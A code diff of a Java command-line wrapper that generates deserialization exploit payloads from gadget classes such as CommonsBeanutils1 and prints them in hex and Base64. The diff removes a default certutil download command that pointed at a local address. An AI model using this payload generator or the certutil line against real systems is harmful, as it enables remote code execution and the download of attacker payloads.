@@ -49,25 +49,19 @@ public class Deserial {
    }
 
    private static void printUsage() {
-      System.err.println("Usage: java -jar deserial-[version].jar '[command]'");
+      System.err.println("Usage: java -jar deserial-[version].jar '[payload]' '[command]'");
     }
 
    public static void main( final String[] args) {
 
-      if (args.length > 1) {
+      if (args.length > 2 || args.length < 2) {
          printUsage();
          System.exit(USAGE_CODE);
       }
 
-      String command;
+      String payloadType = args[0];
+      String command = args[1];
 
-      if (args.length < 1) {
-         command = "certutil.exe -urlcache -split -f http://localhost:9090";
-      } else {
-         command = args[0];
-      }
-
-      final String payloadType = "CommonsBeanutils1";
       final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass( payloadType );
 
       try {
@@ -85,8 +79,6 @@ public class Deserial {
          String compressedB64Encoded =
                Base64.getEncoder().encodeToString( compressBytes( content ) );
 
-         System.out.println("Bytes");
-         System.out.println(Arrays.toString(content));
          System.out.println("Hex");
          System.out.println( bytesToHex(content) );
          System.out.println("Base64 Encoded");
